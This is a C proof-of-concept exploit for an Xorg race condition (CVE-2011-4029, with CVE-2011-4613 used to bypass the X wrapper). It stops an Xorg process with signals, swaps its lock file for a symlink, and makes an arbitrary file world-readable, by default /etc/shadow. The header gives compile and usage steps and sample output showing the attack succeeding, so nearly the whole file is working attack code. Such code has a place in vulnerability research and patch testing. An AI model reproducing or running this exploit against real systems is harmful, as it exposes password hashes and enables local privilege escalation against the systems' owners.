/* xchmod.c -- Xorg file permission change vulnerability PoC

   Author:    vladz (http://vladz.devzero.fr)
   Date:      2011/12/15
   Software:  www.x.org
   Version:   Xorg 1.4 to 1.11.2 in all configurations.  Xorg 1.3 and
              earlier if built with the USE_CHMOD preprocessor identifier
   Tested on: Debian 6.0.2 up to date with X default configuration issued
              from the xserver-xorg-core package (version 2:1.7.7-13)
   CVEs:      CVE-2011-4029 & CVE-2011-4613

   This PoC exploits CVE-2011-4029 to set the rights 444 (read for all) on
   arbitrary file specified as argument (default file is "/etc/shadow").
   It uses SIGSTOP/SIGCONT signals and the Inotify API to win the race.
   Made for EDUCATIONAL PURPOSES ONLY!

   On some configurations, this exploit must be launched from a TTY (switch
   by typing Ctrl-Alt-Fn).  But not on Debian, because it bypasses the X
   wrapper permission thanks to CVE-2011-4613!

   Tested on Debian 6.0.3 up to date with X default configuration issued
   from the xserver-xorg-core package (version 2:1.7.7-13).

   Compile:  cc xchmod.c -o xchmod
   Usage:    ./xchmod [/path/to/file]    (default file is /etc/shadow)

   $ ls -l /etc/shadow
   -rw-r----- 1 root shadow 1072 Aug  7 07:10 /etc/shadow
   $ ./xchmod
   [+] Trying to stop a Xorg process right before chmod()
   [+] Process ID 4134 stopped (SIGSTOP sent)
   [+] Removing /tmp/.tX1-lock by launching another Xorg process
   [+] Creating evil symlink (/tmp/.tX1-lock -> /etc/shadow)
   [+] Process ID 4134 resumed (SIGCONT sent)
   [+] Attack succeeded, ls -l /etc/shadow:
   -r--r--r-- 1 root shadow 1072 Aug  7 07:10 /etc/shadow

   -----------------------------------------------------------------------

    "THE BEER-WARE LICENSE" (Revision 42):
    <vladz@devzero.fr> wrote this file. As long as you retain this notice
    you can do whatever you want with this stuff. If we meet some day, and
    you think this stuff is worth it, you can buy me a beer in return. -V.
*/

#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <syscall.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/inotify.h>
#include <sys/types.h>
#include <sys/wait.h>

#define XORG_BIN     "/usr/bin/X"
#define DISPLAY      ":1"


char *get_tty_number(void) {
  char tty_name[128], *ptr;

  memset(tty_name, '\0', sizeof(tty_name));
  readlink("/proc/self/fd/0", tty_name, sizeof(tty_name));

  if ((ptr = strstr(tty_name, "tty")))
    return ptr + 3;

  return NULL;
}


void timeout_handler() {

  printf("[-] read() timeout!  \n");
  if (!get_tty_number())
    printf("Try with console ownership: switch to a TTY by using "
	   "Ctrl-Alt-F[1-6] and try again.\n");
  else
    printf("Maybe inotify isn't enabled.\n");

  _exit(1);
}


int launch_xorg_instance(int inc) {
  int pid, newfd;
  char *opt[] = { XORG_BIN, DISPLAY, NULL };

  if ((pid = fork()) == 0) {
    newfd = open("/dev/tty", O_RDONLY);
    dup2(newfd, 0); close(1); close(2); 

    nice(inc); usleep(30000);
    execve(XORG_BIN, opt, NULL);
    _exit(0);
  }

  return pid;
}


void show_target_file(char *file) {
  char cmd[128];

  memset(cmd, '\0', sizeof(cmd));
  sprintf(cmd, "/bin/ls -l %s", file);
  system(cmd);
}


int main(int argc, char **argv) {
  pid_t pid, remove_pid;
  struct stat st;
  int fd, wd, status;
  char targetfile[128], lockfiletmp[20], lockfile[20];

  if (argc < 2)
    strcpy(targetfile, "/etc/shadow");
  else
    strcpy(targetfile, argv[1]);

  sprintf(lockfile, "/tmp/.X%s-lock", DISPLAY + 1);
  sprintf(lockfiletmp, "/tmp/.tX%s-lock", DISPLAY + 1);

  if (stat(lockfile, &st) == 0) {
    printf("[-] %s exists, maybe Xorg is already running on this"
	   " display?  Choose another display by editing the DISPLAY"
	   " attributes.\n", lockfile);
    return 1;
  }

  umask(077);
  signal(SIGALRM, timeout_handler);

  symlink("/dontexist", lockfile);

  fd = inotify_init();
  wd = inotify_add_watch(fd, "/tmp", IN_CREATE);

  alarm(5);
  printf("[+] Trying to stop a Xorg process right before chmod()\n");
  pid = launch_xorg_instance(19);
  syscall(SYS_read, fd, 0, 0);
  syscall(SYS_kill, pid, SIGSTOP);
  alarm(0);

  printf("[+] Process ID %d stopped (SIGSTOP sent)\n", pid);

  inotify_rm_watch(fd, wd);

  stat(lockfiletmp, &st);
  if ((st.st_mode & 4) != 0) {
    printf("[-] %s file has wrong rights (%o) removing it by launching"
	   " another Xorg process\n[-] Attack failed.  Try again!\n",
	   lockfiletmp, st.st_mode);

    remove_pid = launch_xorg_instance(0);
    waitpid(remove_pid, &status, 0);
    unlink(lockfile);
    return 1;
  }

  printf("[+] Removing %s by launching another Xorg process\n",
	 lockfiletmp);
  remove_pid = launch_xorg_instance(0);
  waitpid(remove_pid, &status, 0);

  printf("[+] Creating evil symlink (%s -> %s)\n", lockfiletmp,
	 targetfile);
  symlink(targetfile, lockfiletmp);

  printf("[+] Process ID %d resumed (SIGCONT sent)\n", pid);
  kill(pid, SIGCONT);
  waitpid(pid, &status, 0);

  unlink(lockfile);

  stat(targetfile, &st);
  if (!(st.st_mode & 004)) {
    printf("[-] Attack failed, rights are %o.  Try again!\n", st.st_mode);
    return 1;
  }

  printf("[+] Attack succeeded, ls -l %s:\n", targetfile);
  show_target_file(targetfile);

  return 0;
}
